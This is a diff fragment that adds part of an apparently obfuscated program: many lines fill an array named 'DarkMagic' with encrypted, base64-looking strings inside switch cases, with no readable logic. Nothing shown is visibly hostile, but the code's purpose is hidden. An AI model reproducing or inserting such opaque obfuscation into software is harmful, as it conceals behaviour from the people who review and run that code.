+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[80] = "ECjyvVhK3+9bdjKa9dSN/5mOtZppRGi/JMrZltfwxqw=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[81] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sESweiDmMNr6g=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[82] = "XfAmJrjLaqGs7/GOMWfHrNIQVh05B9h3/+N8UtGpeqs=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[83] = "XfAmJrjLaqGs7/GOMWfHrCaMZs2WYGgHWlK/imViH98=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[84] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEBrvySD/YJBQ=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[85] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuPgayj/WsQ/O";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[86] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sENg4YOBRmTPI=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[87] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuLVkFnmLoHIA";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[88] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEzNquQUOr2wo=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[89] = "ECjyvVhK3+9bdjKa9dSN/xZSOSdEO8ho";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[90] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuIWdSV/1RkQW";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[91] = "XfAmJrjLaqGs7/GOMWfHrDC5ewxEpBns";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[92] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEA2nMBLtBzgw=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[93] = "XfAmJrjLaqGs7/GOMWfHrCvA5mqsGBbnA07FaWBKzb8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[94] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeX4sSyL+VHzF8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[95] = "XfAmJrjLaqGs7/GOMWfHrNgnu+jX2SuraXtEBEmg5JI=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[96] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OunXsZY5A5KaU0FnT3vUfA";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[97] = "XfAmJrjLaqGs7/GOMWfHrH2K8xOs1kjCBGRtdhrBWgA=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[98] = "ECjyvVhK3+9bdjKa9dSN/4wMftwkCN14";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[99] = "XfAmJrjLaqGs7/GOMWfHrJ8RtR+cy6eZXFpPVpUtIEk=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[100] = "XfAmJrjLaqGs7/GOMWfHrCcBmYcxUYV8";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[101] = "XfAmJrjLaqGs7/GOMWfHrDTww4z1hdr3";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[102] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuI0YHAMyMeF5";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[103] = "XfAmJrjLaqGs7/GOMWfHrCL3lEZUJVJVpjlw1YIWR6M=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[104] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuDpnIGAvaFn4";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[105] = "ECjyvVhK3+9bdjKa9dSN/zpgP1+IlN9LQzI3JwR4yD8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[106] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuEg1ZMjXZZpW";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[107] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sESRmyxH3R1xE=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[108] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEaQhXj1cHVG8=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[109] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuBbQKEdMRHA3";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[110] = "xz4v/LJoekl0h0FN2fFaxvBblFbFd5OPHW/Ap4Cf/5OrZNwvRWBFCW5580BY73V0";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[111] = "9qnMzS3sR0XxpsH1KlOW1ljDFkMoZbkNNzP0qznOkZzsKKCNeFRK0edy4pIKNtbcLLuwGtsKHOdLlajeeCxihGiA13Goso63bwtFwHGtQcNVQa6A4hgDko5VDTgNldeX31hsw/CZ+JY=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[112] = "WcLDfBj07KDtGnwN7utJimNzln3040jQ9CE0JrxpHy+2K/tt6R2TZBiV29juUk8LUEZpDzbIdFc8dvETHbzqJh2zIB5Mo3sEszBD7dIegWo=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[113] = "XfAmJrjLaqGs7/GOMWfHrO64eVvBD7FW2CCxzcxBmTg=";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[114] = "XfAmJrjLaqGs7/GOMWfHrHtKCdMqaWMu";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[115] = "U5wKw6DNvSPGWvsBlhLnJEB5dpWhbwIYieafLnbrp9h/AF94loxPWoqDH/TAOuUXqkdSEkMWuCm1iWMkE6/FP8y4Oofd0v+Ssyma6O/IZMNcaDOIPv/SsnXis2dJvtlB6f4p1XTuhd5bDksrGzGnQGLG4K7kHkBfJcauZd2t+vVvz1VYt+RlJOgZcjszeuUKRkOF2bxRorPHaYmEMe4Puw==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[116] = "M+wP1oJmbeTzpSkpuP8BPXgxvgKaeP0fk1mv99cvAl4NudtC171dl3vvm9y+6zk+EsURfTvrDEIECGx2AuEMGp9Mow4063Ip4up1G7aTSZd6uE/c66WvOfZs3E4pgT0y+v7qi6K2qd9j2Ntzn3ryETRTM2bNeQoDZ/SRBdgoEonsqfO8p3rKWL4rg0G0yoFoZRYAlrvN1zySDxmjMS0ej0usqgzDEd+WY7BQgQVpH+CGPoCPOIgW3w==";
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[117] = "9JmfTUPJ5sZDo286yKNFT3Z5RAGCLEMp6FXc0lrNegBTvNvdRgZLuH9JPjQj17Vu";
+                    looporswitchbreak()
+                
+                case 2:
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[0] = "Eoiew7RN4aj1himMYwUBnGpewihveih1";
+                    looporswitchbreak()
+                
+                case 4:
+                    DarkMagic::v0005_27759afbd4d1d8bb8a5777d[0] = "jh0VYxX5LEGQV0MTsylwDqZXxZZ9ht6o";
+                    looporswitchbreak()
+            }
+            
+            var_6_E3 += 1;
+        }
+    }
+}
